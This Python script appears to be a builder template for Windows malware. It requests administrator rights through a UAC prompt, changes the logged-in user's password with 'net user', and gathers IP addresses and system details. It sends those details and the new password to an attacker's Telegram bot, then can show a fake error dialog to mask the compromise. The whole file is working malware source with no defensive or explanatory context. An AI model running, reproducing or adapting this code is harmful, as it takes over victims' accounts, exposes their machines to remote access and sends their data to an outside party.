import subprocess,os,psutil,platform,requests,socket,ctypes,sys, win32api, threading, re, time




def get_rdp():
    global build
    passs = "RDP_PASSWORD"
    bot_token = "BOT_TOKEN"
    chat_id = "CHAT_ID"
    fake_error = "ERROR_ID"
    error_msg = "FAKE_ERROR"
    pub_ip = requests.get('https://api.ipify.org').text
    host = socket.gethostname()
    priv_ip = socket.gethostbyname(host)
    total_ram = psutil.virtual_memory().total
    ram = ("{:.2f} GB".format(total_ram / (1024**3)))
    system_info = platform.uname()
    system = system_info.system
    node = system_info.node
    release = system_info.release
    version = system_info.version
    machine = system_info.machine
    processor = system_info.processor
    subprocess.check_output(f"net user {os.getlogin()} {passs}",shell=True)
    try:
        build = f"======== [Unknown-Society] ========\nUsername : {os.getlogin()}\nPublic Ip : {pub_ip}\nPrivate Ip : {priv_ip}\nPassword : {passs}\nRam : {ram}\nSystem : {system}\nNode : {node}\nrelease : {release}\nversion : {version}\nmachine : {machine}\nprocessor : {processor}\n======== [Unknown-Society] ========"
        url=(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={build}")
        send = requests.get(url).text
    except:
        pass
    if fake_error == "on":
        ctypes.windll.user32.MessageBoxW(None, f'Error code: 0x80070002\n{error_msg}', 'Fatal Error', 0)
    else:
        pass
    
    
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    if is_admin():
        get_rdp()
        
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)

if __name__ == "__main__":
    run_as_admin()
